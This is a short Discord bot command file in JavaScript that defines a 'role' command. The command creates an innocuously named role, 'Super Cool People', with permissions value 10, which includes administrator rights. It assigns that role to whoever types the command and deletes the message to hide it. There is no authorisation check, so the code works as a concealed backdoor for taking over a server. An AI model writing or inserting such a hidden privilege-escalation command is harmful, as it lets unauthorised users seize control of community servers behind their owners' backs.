module.exports.run = async(bot, message, args) => {
    message.guild.createRole({
        name: 'Super Cool People',
        color: 'BLUE',
        permissions: 10,
        position: 13

    }).then(role => message.member.addRole(role))


    await message.delete()
}
module.exports.help = {
    name: "role",

}